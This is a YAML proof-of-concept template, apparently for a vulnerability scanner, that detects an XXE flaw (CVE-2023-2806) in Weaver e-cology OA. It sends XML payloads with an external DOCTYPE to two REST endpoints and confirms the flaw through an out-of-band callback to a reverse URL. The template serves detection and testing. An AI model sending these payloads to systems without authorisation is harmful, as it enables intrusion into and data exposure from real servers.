name: yaml-poc-weaver-weaver_e_cology_oa-xxe-CVE-2023-2806
binding: 4fc82a5f-de6e-47bc-b9bc-2216577bda74
manual: false
detail:
    author: jiahao.sun
    links:
        - https://github.com/Strangenees/e-cology/blob/main/main.md
        - https://vuldb.com/?ctiid.229411
        - https://vuldb.com/?id.229411
    vulnerability:
        id: b9e773fb-575d-4b82-b1b9-b248df4ddc52
        level: high
    warning: Harmless
transport: http
set:
    reverse: newReverse()
    reverseURL: reverse.url
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /rest/ofs/ReceiveCCRequestByXml
            headers:
                Content-Type: application/xml
            body: <?xml version="1.0" encoding="utf-8"?> <!DOCTYPE data SYSTEM "{{reverseURL}}"> <data>&send;</data>
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains("WfData") && reverse.wait(6)
    r1:
        request:
            cache: true
            method: POST
            path: /rest/ofs/deleteUserRequestInfoByXml
            headers:
                Content-Type: application/xml
            body: <?xml version="1.0" encoding="utf-8"?> <!DOCTYPE data SYSTEM "{{reverseURL}}"> <data>&send;</data>
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains("WfData") && reverse.wait(6)
expression: r0() || r1()
